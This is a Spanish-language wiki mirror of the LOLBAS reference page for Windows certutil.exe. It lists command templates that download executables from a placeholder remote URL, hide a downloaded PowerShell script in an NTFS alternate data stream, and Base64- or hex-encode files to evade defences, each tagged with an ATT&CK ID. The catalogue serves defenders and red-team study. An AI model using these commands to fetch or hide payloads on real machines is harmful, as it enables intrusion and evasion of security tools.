# LOLBAS: Certutil.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Decode`, `Download`, `Encode`

Windows binary used for handling certificates

## Comandos

### Download file from Internet

Download · priv: User · T1105

```cmd
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

Download and save an executable to disk in the current folder.

### Download file from Internet

Download · priv: User · T1105

```cmd
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
```

Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.

### Download file from Internet and save it in an NTFS Alternate Data Stream

ADS · priv: User · T1564.004

```cmd
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
```

Download and save a .ps1 file to an Alternate Data Stream (ADS).

### Download file from Internet

Download · priv: User · T1105

```cmd
certutil.exe -URL {REMOTEURL:.exe}
```

Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.

### Encode files to evade defensive measures

Encode · priv: User · T1027.013

```cmd
certutil -encode {PATH} {PATH:.base64}
```

Command to encode a file using Base64

### Decode files to evade defensive measures

Decode · priv: User · T1140

```cmd
certutil -decode {PATH:.base64} {PATH}
```

Command to decode a Base64 encoded file.

### Decode files to evade defensive measures

Decode · priv: User · T1140

```cmd
certutil -decodehex {PATH:.hex} {PATH}
```

Command to decode a hexadecimal-encoded file.

